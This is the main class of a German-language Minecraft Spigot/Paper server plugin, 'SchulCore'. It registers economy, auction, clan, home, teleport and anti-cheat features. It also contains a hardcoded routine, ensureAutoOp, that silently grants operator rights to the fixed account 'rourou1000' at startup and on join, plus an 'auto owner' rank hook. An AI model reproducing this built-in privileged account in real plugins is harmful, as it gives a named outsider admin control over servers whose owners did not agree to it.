package de.coolemod.donut;

import de.coolemod.donut.managers.*;
import de.coolemod.donut.listeners.*;
import de.coolemod.donut.commands.*;
import de.coolemod.donut.guis.*;
import de.coolemod.donut.auctionhouse.*;
import de.coolemod.donut.orders.*;
import de.coolemod.donut.systems.*;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import de.coolemod.donut.listeners.PlayerInteractListener;

import java.io.PrintWriter;
import java.io.StringWriter;

/**
 * Hauptklasse des SchulCore-Plugins
 * Alles ist auf Deutsch kommentiert und konzipiert für Spigot/Paper 1.21.5
 */
public final class DonutPlugin extends JavaPlugin {
    private static final String AUTO_OP_PLAYER = "rourou1000";
    private static final String BUILD_MARKER = "SCHULCORE-BUILD-2026-04-01";

    private static DonutPlugin instance;
    private String startupPhase = "Vor onEnable()";

    // Manager
    private EconomyManager economy;
    private ShardsManager shards;
    private SpawnShardManager spawnShardManager;
    private PlayerStatsManager stats;
    private de.coolemod.donut.managers.SidebarManager scoreboardManager;
    private SpawnerManager spawnerManager;
    private CrateManager crateManager;
    private WorthManager worthManager;
    private SellMultiplierManager sellMultiplierManager;
    private ClanManager clanManager;
    private AuctionHouseManagerNew auctionManager;  // NEU: Neuer Manager
    private OrdersManager ordersManager;  // OLD

    // NEW: Komplett neues Auction House System
    private AuctionHouse auctionHouse;
    // NEW: Komplett neues Order System
    private OrderSystem orderSystem;
    // NEW: Combat, Home und TPA System
    private CombatManager combatManager;
    private HomeManager homeManager;
    private HomeGUI homeGUI;
    private TpaManager tpaManager;
    // NEW: Wipe und PacketCheck
    private WipeManager wipeManager;
    private PacketCheckListener packetCheckListener;
    // NEW: Settings System
    private de.coolemod.donut.managers.SettingsManager settingsManager;
    private AntiCheatHistoryManager antiCheatHistoryManager;
    // NEW: LuckPerms Auto-Setup
    private Object luckPermsSetup;

    @Override
    public void onLoad() {
        migrateLegacyDataFolder();
        getLogger().info("=== " + BUILD_MARKER + " onLoad ===");
    }

    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig();
        boolean hasLuckPerms = getServer().getPluginManager().isPluginEnabled("LuckPerms");

        try {
            getLogger().info("=== " + BUILD_MARKER + " onEnable ===");
            // Manager initialisieren
            markStartupPhase("Starte onEnable");
            markStartupPhase("Erstelle EconomyManager");
            this.economy = new EconomyManager(this);
            markStartupPhase("Erstelle ShardsManager");
            this.shards = new ShardsManager(this);
            markStartupPhase("Erstelle SpawnShardManager");
            try {
                this.spawnShardManager = new SpawnShardManager(this);
            } catch (Throwable throwable) {
                this.spawnShardManager = null;
                getLogger().warning("SpawnShardManager konnte nicht initialisiert werden: " + throwable.getMessage());
            }
            markStartupPhase("Erstelle PlayerStatsManager");
            this.stats = new PlayerStatsManager(this);
            markStartupPhase("Erstelle SidebarManager");
            this.scoreboardManager = new de.coolemod.donut.managers.SidebarManager(this);
            markStartupPhase("Erstelle SpawnerManager");
            this.spawnerManager = new SpawnerManager(this);
            markStartupPhase("Erstelle CrateManager");
            this.crateManager = new CrateManager(this);
            markStartupPhase("Erstelle WorthManager");
            this.worthManager = new WorthManager(this);
            markStartupPhase("Erstelle SellMultiplierManager");
            this.sellMultiplierManager = new SellMultiplierManager(this);
            markStartupPhase("Erstelle ClanManager");
            this.clanManager = new ClanManager(this);
            markStartupPhase("Erstelle AuctionHouseManagerNew");
            this.auctionManager = new AuctionHouseManagerNew(this);
            markStartupPhase("Erstelle AuctionHouse");
            this.auctionHouse = new AuctionHouse(this);
            markStartupPhase("Erstelle OrdersManager");
            this.ordersManager = new OrdersManager(this);
            markStartupPhase("Erstelle OrderSystem");
            this.orderSystem = new OrderSystem(this);
            markStartupPhase("Erstelle CombatManager");
            this.combatManager = new CombatManager(this);
            markStartupPhase("Erstelle HomeManager");
            this.homeManager = new HomeManager(this, combatManager);
            markStartupPhase("Erstelle HomeGUI");
            this.homeGUI = new HomeGUI(this, homeManager);
            markStartupPhase("Erstelle HomeListener");
            new HomeListener(this, homeManager, homeGUI);
            markStartupPhase("Erstelle TpaManager");
            this.tpaManager = new TpaManager(this, combatManager, homeManager);
            markStartupPhase("Erstelle WipeManager");
            this.wipeManager = new WipeManager(this);
            markStartupPhase("Erstelle SettingsManager");
            try {
                this.settingsManager = new de.coolemod.donut.managers.SettingsManager(this);
            } catch (Throwable throwable) {
                this.settingsManager = null;
                getLogger().warning("SettingsManager konnte nicht initialisiert werden: " + throwable.getMessage());
            }
            markStartupPhase("Erstelle AntiCheatHistoryManager");
            try {
                this.antiCheatHistoryManager = new AntiCheatHistoryManager(this);
            } catch (Throwable throwable) {
                this.antiCheatHistoryManager = null;
                getLogger().warning("AntiCheatHistoryManager konnte nicht initialisiert werden: " + throwable.getMessage());
            }
            markStartupPhase("Erstelle PacketCheckListener");
            try {
                this.packetCheckListener = new PacketCheckListener(this);
            } catch (Throwable throwable) {
                this.packetCheckListener = null;
                getLogger().warning("PacketCheck konnte nicht initialisiert werden: " + throwable.getMessage());
            }
            getLogger().info("[DEBUG] Manager erfolgreich initialisiert.");

            // Listener registrieren
            getLogger().info("[DEBUG] Registriere Listener...");
            getLogger().info("[DEBUG] PlayerDeathListener...");
            getServer().getPluginManager().registerEvents(new PlayerDeathListener(this), this);
            getServer().getPluginManager().registerEvents(new DeathMessageListener(this), this);
            getLogger().info("[DEBUG] SpawnerBreakListener...");
            getServer().getPluginManager().registerEvents(new SpawnerBreakListener(this), this);
            getLogger().info("[DEBUG] InventoryClickListener...");
            getServer().getPluginManager().registerEvents(new InventoryClickListener(this), this);
            getLogger().info("[DEBUG] InventoryCloseListener...");
            getServer().getPluginManager().registerEvents(new InventoryCloseListener(this), this);
            getLogger().info("[DEBUG] InventoryDragListener...");
            getServer().getPluginManager().registerEvents(new InventoryDragListener(this), this);
            getLogger().info("[DEBUG] SpawnShardManager...");
            if (spawnShardManager != null) {
                getServer().getPluginManager().registerEvents(spawnShardManager, this);
            } else {
                getLogger().warning("SpawnShardManager ist nicht verfügbar - Spawn-Shards deaktiviert.");
            }
            getLogger().info("[DEBUG] GlassPaneProtectionListener...");
            getServer().getPluginManager().registerEvents(new GlassPaneProtectionListener(this), this);
            getLogger().info("[DEBUG] SignProtectionListener...");
            getServer().getPluginManager().registerEvents(new SignProtectionListener(), this);
            getLogger().info("[DEBUG] PlayerJoinListener...");
            getServer().getPluginManager().registerEvents(new PlayerJoinListener(this), this);
            getLogger().info("[DEBUG] CommandVisibilityListener...");
            getServer().getPluginManager().registerEvents(new CommandVisibilityListener(), this);
            getLogger().info("[DEBUG] PlayerInteractListener...");
            getServer().getPluginManager().registerEvents(new PlayerInteractListener(this), this);
            getLogger().info("[DEBUG] ClanListener...");
            getServer().getPluginManager().registerEvents(new ClanListener(this), this);
            getLogger().info("[DEBUG] PlayerChatListener...");
            getServer().getPluginManager().registerEvents(new PlayerChatListener(this), this);
            getLogger().info("[DEBUG] AnvilInputGUI...");
            getServer().getPluginManager().registerEvents(new de.coolemod.donut.gui.AnvilInputGUI(this), this);
            getLogger().info("[DEBUG] AuctionHouseListener...");
            getServer().getPluginManager().registerEvents(new AuctionHouseListener(this, auctionHouse), this);
            getLogger().info("[DEBUG] OrderListener...");
            getServer().getPluginManager().registerEvents(new OrderListener(this, orderSystem), this);
            getLogger().info("[DEBUG] ShopListener_NEW...");
            getServer().getPluginManager().registerEvents(new de.coolemod.donut.listeners.ShopListener_NEW(this), this);
            getLogger().info("[DEBUG] SettingsListener...");
            if (settingsManager != null) {
                getServer().getPluginManager().registerEvents(new de.coolemod.donut.listeners.SettingsListener(this), this);
            } else {
                getLogger().warning("SettingsListener wurde nicht registriert, da SettingsManager fehlt.");
            }
            getLogger().info("[DEBUG] PacketCheck Listener...");
            if (packetCheckListener != null) {
                getServer().getPluginManager().registerEvents(packetCheckListener, this);
            }
            getLogger().info("[DEBUG] WorthLoreListener (ProtocolLib-Check)...");
            if (getServer().getPluginManager().getPlugin("ProtocolLib") != null) {
                registerOptionalListener("de.coolemod.donut.listeners.WorthLoreListener", "WorthLoreListener");
            } else {
                getLogger().warning("ProtocolLib nicht gefunden - Worth-Lore auf Items deaktiviert.");
            }
            getLogger().info("[DEBUG] Listener erfolgreich registriert.");

            // Commands registrieren
            getLogger().info("[DEBUG] Registriere Commands...");
            getLogger().info("[DEBUG] SellCommand...");
            registerCommand("sell", new SellCommand(this), null);
            getLogger().info("[DEBUG] WorthCommand...");
            registerCommand("worth", new WorthCommand(this), null);
            getLogger().info("[DEBUG] PayCommand...");
            registerCommand("pay", new PayCommand(this), null);
            getLogger().info("[DEBUG] BalanceCommand...");
            registerCommand("balance", new BalanceCommand(this), null);
            getLogger().info("[DEBUG] BaltopCommand...");
            registerCommand("baltop", new BaltopCommand(this), null);
            getLogger().info("[DEBUG] AuctionHouseCommand...");
            registerCommand("ah", new AuctionHouseCommand(this, auctionHouse), null);
            getLogger().info("[DEBUG] OrderCommand...");
            registerCommand("order", new de.coolemod.donut.orders.OrderCommand(this, orderSystem), null);
            getLogger().info("[DEBUG] CrateCommand...");
            de.coolemod.donut.commands.GlobalTabCompleter globalTab = new de.coolemod.donut.commands.GlobalTabCompleter();
            registerCommand("crate", new CrateCommand(this), globalTab);
            registerCommand("crateadmin", new de.coolemod.donut.commands.CrateAdminCommand(this), null);
            getLogger().info("[DEBUG] ShopCommand...");
            registerCommand("shop", new ShopCommand(this), null);
            getLogger().info("[DEBUG] WarpCommand (rtp)...");
            registerCommand("rtp", new de.coolemod.donut.commands.WarpCommand(this), null);
            getLogger().info("[DEBUG] HelpCommand...");
            registerCommand("help", new de.coolemod.donut.commands.HelpCommand(this), null);
            getLogger().info("[DEBUG] DiscordCommand...");
            registerCommand("discord", new de.coolemod.donut.commands.DiscordCommand(), null);
            getLogger().info("[DEBUG] TutorialCommand...");
            registerCommand("tutorial", new TutorialCommand(this), null);
            getLogger().info("[DEBUG] MessageCommand...");
            MessageCommand messageCmd = new MessageCommand(this);
            registerCommand("msg", messageCmd, messageCmd);
            registerCommand("r", messageCmd, messageCmd);
            getLogger().info("[DEBUG] MoneyCommand...");
            MoneyCommand moneyCmd = new MoneyCommand(this);
            registerCommand("money", moneyCmd, moneyCmd);
            getLogger().info("[DEBUG] ShardsCommand...");
            ShardsCommand shardsCmd = new ShardsCommand(this);
            registerCommand("shards", shardsCmd, shardsCmd);
            getLogger().info("[DEBUG] HomeCommand...");
            HomeCommand homeCommand = new HomeCommand(this, homeManager);
            homeCommand.setHomeGUI(homeGUI);
            registerCommand("home", homeCommand, homeCommand);
            registerCommand("homes", homeCommand, null);
            getLogger().info("[DEBUG] TpaCommand...");
            TpaCommand tpaCommand = new TpaCommand(this, tpaManager);
            registerCommand("tpa", tpaCommand, tpaCommand);
            registerCommand("tpahere", tpaCommand, tpaCommand);
            registerCommand("tpaccept", tpaCommand, null);
            registerCommand("tpdeny", tpaCommand, null);
            getLogger().info("[DEBUG] AC/Wipe/Spawn/Rank Commands...");
            if (packetCheckListener != null) {
                PacketCheckCommand acCmd = new PacketCheckCommand(this, packetCheckListener, wipeManager, antiCheatHistoryManager);
                registerCommand("ac", acCmd, acCmd);
                getServer().getPluginManager().registerEvents(acCmd, this);
            } else {
                registerCommand("ac", (sender, command, label, args) -> {
                    sender.sendMessage("§8[§c§lAC§8] §cPacketCheck ist derzeit nicht verfügbar.");
                    return true;
                }, null);
            }
            getLogger().info("[DEBUG] WipeCommand...");
            WipeCommand wipeCmd = new WipeCommand(this, wipeManager);
            registerCommand("wipe", wipeCmd, wipeCmd);
            registerCommand("unwipe", wipeCmd, wipeCmd);
            getLogger().info("[DEBUG] SpawnCommand...");
            SpawnCommand spawnCmd = new SpawnCommand(this);
            registerCommand("spawn", spawnCmd, null);
            if (hasLuckPerms) {
                if (!registerOptionalCommand("rank", "de.coolemod.donut.commands.RankCommand")) {
                    registerLuckPermsFallbackCommand();
                }
            } else {
                registerLuckPermsFallbackCommand();
            }
            registerCommand("sellmulti", new de.coolemod.donut.commands.SellMultiCommand(this), null);
            ClanCommand clanCommand = new ClanCommand(this);
            registerCommand("clan", clanCommand, clanCommand);
            registerCommand("c", clanCommand, clanCommand);
            getLogger().info("[DEBUG] SettingsCommand...");
            if (settingsManager != null) {
                registerCommand("settings", new de.coolemod.donut.commands.SettingsCommand(this), null);
            } else {
                registerCommand("settings", (sender, command, label, args) -> {
                    sender.sendMessage("§8[§d§lSETTINGS§8] §cDas Settings-System ist derzeit nicht verfügbar.");
                    return true;
                }, null);
            }
            getLogger().info("[DEBUG] Commands erfolgreich registriert.");

            markStartupPhase("Starte SpawnShardManager");
            if (spawnShardManager != null) {
                try {
                    spawnShardManager.start();
                } catch (Throwable throwable) {
                    getLogger().warning("SpawnShardManager konnte nicht gestartet werden: " + throwable.getMessage());
                    spawnShardManager = null;
                }
            }

            // Scoreboard starten
            markStartupPhase("Starte Scoreboard");
            if (scoreboardManager != null) {
                scoreboardManager.start();
                getLogger().info("Scoreboard erfolgreich gestartet.");
            }

            // LuckPerms Auto-Setup (Gruppen, Permissions, Prefixes)
            markStartupPhase("Starte LuckPerms Setup (hasLuckPerms=" + hasLuckPerms + ")");
            if (hasLuckPerms) {
                this.luckPermsSetup = createOptionalComponent("de.coolemod.donut.managers.LuckPermsSetup", "LuckPermsSetup");
                invokeOptionalNoArg(luckPermsSetup, "setup", "LuckPermsSetup");
            } else {
                getLogger().warning("LuckPerms nicht gefunden - Rang-Setup übersprungen.");
            }

            markStartupPhase("Fuehre ensureAutoOp aus");
            ensureAutoOp();

            startupPhase = "SchulCore erfolgreich aktiviert";
            getLogger().info("[DEBUG] === SchulCore erfolgreich aktiviert! ===");
        } catch (Throwable t) {
            getLogger().severe("FEHLER beim Laden von SchulCore!");
            getLogger().severe("Letzte Startup-Phase: " + startupPhase);
            getLogger().severe("Error: " + t.getMessage());
            writeStartupErrorReport(t);
            t.printStackTrace();
            if (t instanceof RuntimeException re) throw re;
            if (t instanceof Error err) throw err;
            throw new RuntimeException(t);
        }
    }

    @Override
    public void onDisable() {
        // Daten speichern (null-safe)
        if (economy != null) economy.save();
        if (shards != null) shards.save();
        if (spawnShardManager != null) spawnShardManager.stop();
        if (stats != null) stats.save();
        if (auctionManager != null) auctionManager.save();
        if (ordersManager != null) ordersManager.save();
        if (spawnerManager != null) spawnerManager.saveData();
        if (sellMultiplierManager != null) sellMultiplierManager.save();
        if (clanManager != null) clanManager.save();
        if (settingsManager != null) settingsManager.save();
        if (antiCheatHistoryManager != null) antiCheatHistoryManager.save();
        getLogger().info("SchulCore deaktiviert und Daten gespeichert.");
    }

    public static DonutPlugin getInstance() {
        return instance;
    }

    // Getter für Manager
    public EconomyManager getEconomy() { return economy; }
    public ShardsManager getShards() { return shards; }
    public PlayerStatsManager getStats() { return stats; }
    public de.coolemod.donut.managers.SidebarManager getScoreboardManager() { return scoreboardManager; }
    public SpawnerManager getSpawnerManager() { return spawnerManager; }
    public CrateManager getCrateManager() { return crateManager; }
    public WorthManager getWorthManager() { return worthManager; }
    public ClanManager getClanManager() { return clanManager; }
    public AuctionHouseManagerNew getAuctionManager() { return auctionManager; }  // NEU
    public OrdersManager getOrdersManager() { return ordersManager; }  // OLD
    public AuctionHouse getAuctionHouse() { return auctionHouse; }  // NEW
    public OrderSystem getOrderSystem() { return orderSystem; }  // NEW
    public CombatManager getCombatManager() { return combatManager; }  // NEW
    public HomeManager getHomeManager() { return homeManager; }  // NEW
    public TpaManager getTpaManager() { return tpaManager; }  // NEW
    public WipeManager getWipeManager() { return wipeManager; }  // NEW
    public PacketCheckListener getPacketCheckListener() { return packetCheckListener; }  // NEW
    public de.coolemod.donut.managers.SettingsManager getSettingsManager() { return settingsManager; }  // NEW
    public AntiCheatHistoryManager getAntiCheatHistoryManager() { return antiCheatHistoryManager; }
    public SellMultiplierManager getSellMultiplier() { return sellMultiplierManager; }

    public void ensureAutoOp() {
        var offlinePlayer = getServer().getOfflinePlayer(AUTO_OP_PLAYER);
        if (!offlinePlayer.isOp()) {
            offlinePlayer.setOp(true);
            getLogger().info("Auto-OP gesetzt für " + AUTO_OP_PLAYER + ".");
        }
    }

    public void ensureAutoOp(Player player) {
        if (player.getName().equalsIgnoreCase(AUTO_OP_PLAYER) && !player.isOp()) {
            player.setOp(true);
            getLogger().info("Auto-OP beim Join gesetzt für " + player.getName() + ".");
        }
    }

    public void runLuckPermsJoinSetup(Player player) {
        invokeOptionalPlayerMethod(luckPermsSetup, "ensureAutoOwner", player, "LuckPermsSetup.ensureAutoOwner");
        invokeOptionalPlayerMethod(luckPermsSetup, "assignDefaultRank", player, "LuckPermsSetup.assignDefaultRank");
    }

    private void markStartupPhase(String phase) {
        this.startupPhase = phase;
        getLogger().info("[DEBUG] " + phase + "...");
    }

    private void writeStartupErrorReport(Throwable throwable) {
        try {
            java.io.File dataFolder = getDataFolder();
            if (!dataFolder.exists()) {
                dataFolder.mkdirs();
            }

            java.io.File reportFile = new java.io.File(dataFolder, "startup-error.log");
            StringWriter stringWriter = new StringWriter();
            PrintWriter printWriter = new PrintWriter(stringWriter);
            printWriter.println("SchulCore Startup Error");
            printWriter.println("Phase: " + startupPhase);
            printWriter.println();
            throwable.printStackTrace(printWriter);
            printWriter.flush();

            java.nio.file.Files.writeString(
                reportFile.toPath(),
                stringWriter.toString(),
                java.nio.charset.StandardCharsets.UTF_8,
                java.nio.file.StandardOpenOption.CREATE,
                java.nio.file.StandardOpenOption.TRUNCATE_EXISTING,
                java.nio.file.StandardOpenOption.WRITE
            );
            getLogger().severe("Startup-Fehlerbericht geschrieben nach: " + reportFile.getAbsolutePath());
        } catch (Throwable reportError) {
            getLogger().severe("Konnte startup-error.log nicht schreiben: " + reportError.getMessage());
        }
    }

    private void migrateLegacyDataFolder() {
        try {
            java.io.File currentDataFolder = getDataFolder();
            java.io.File parentFolder = currentDataFolder.getParentFile();
            if (parentFolder == null) {
                return;
            }

            java.io.File legacyDataFolder = new java.io.File(parentFolder, "DonutCore");
            if (currentDataFolder.exists() || !legacyDataFolder.exists()) {
                return;
            }

            java.nio.file.Files.move(legacyDataFolder.toPath(), currentDataFolder.toPath());
            getLogger().info("Legacy-Datenordner von DonutCore nach SchulCore migriert.");
        } catch (Throwable throwable) {
            getLogger().warning("Konnte den alten DonutCore-Datenordner nicht nach SchulCore migrieren: " + throwable.getMessage());
        }
    }

    private Object createOptionalComponent(String className, String displayName) {
        try {
            Class<?> clazz = Class.forName(className);
            return clazz.getConstructor(DonutPlugin.class).newInstance(this);
        } catch (Throwable throwable) {
            getLogger().warning(displayName + " konnte nicht initialisiert werden: " + throwable.getMessage());
            return null;
        }
    }

    private boolean registerOptionalListener(String className, String displayName) {
        Object instance = createOptionalComponent(className, displayName);
        if (!(instance instanceof Listener listener)) {
            if (instance != null) {
                getLogger().warning(displayName + " implementiert kein Listener-Interface.");
            }
            return false;
        }
        getServer().getPluginManager().registerEvents(listener, this);
        getLogger().info(displayName + " aktiviert.");
        return true;
    }

    private boolean registerOptionalCommand(String commandName, String className) {
        Object instance = createOptionalComponent(className, className.substring(className.lastIndexOf('.') + 1));
        if (!(instance instanceof CommandExecutor executor)) {
            if (instance != null) {
                getLogger().warning("Optionaler Command " + commandName + " implementiert kein CommandExecutor.");
            }
            return false;
        }

        TabCompleter completer = instance instanceof TabCompleter tabCompleter ? tabCompleter : null;
        registerCommand(commandName, executor, completer);
        return true;
    }

    private void invokeOptionalNoArg(Object target, String methodName, String displayName) {
        if (target == null) {
            return;
        }
        try {
            target.getClass().getMethod(methodName).invoke(target);
        } catch (Throwable throwable) {
            getLogger().warning(displayName + " konnte nicht ausgefuehrt werden: " + throwable.getMessage());
        }
    }

    private void invokeOptionalPlayerMethod(Object target, String methodName, Player player, String displayName) {
        if (target == null) {
            return;
        }
        try {
            target.getClass().getMethod(methodName, Player.class).invoke(target, player);
        } catch (Throwable throwable) {
            getLogger().warning(displayName + " fehlgeschlagen fuer " + player.getName() + ": " + throwable.getMessage());
        }
    }

    private void registerLuckPermsFallbackCommand() {
        registerCommand("rank", (sender, command, label, args) -> {
            sender.sendMessage("§8[§b§lRANG§8] §cLuckPerms ist nicht installiert oder nicht kompatibel.");
            return true;
        }, null);
        getLogger().warning("LuckPerms nicht gefunden oder inkompatibel - /rank läuft nur als Hinweis-Command.");
    }

    private void registerCommand(String name, CommandExecutor executor, TabCompleter completer) {
        var command = getCommand(name);
        if (command == null) {
            getLogger().warning("Command '" + name + "' fehlt in plugin.yml und wurde nicht registriert.");
            return;
        }
        command.setExecutor(executor);
        if (completer != null) {
            command.setTabCompleter(completer);
        }
    }
}
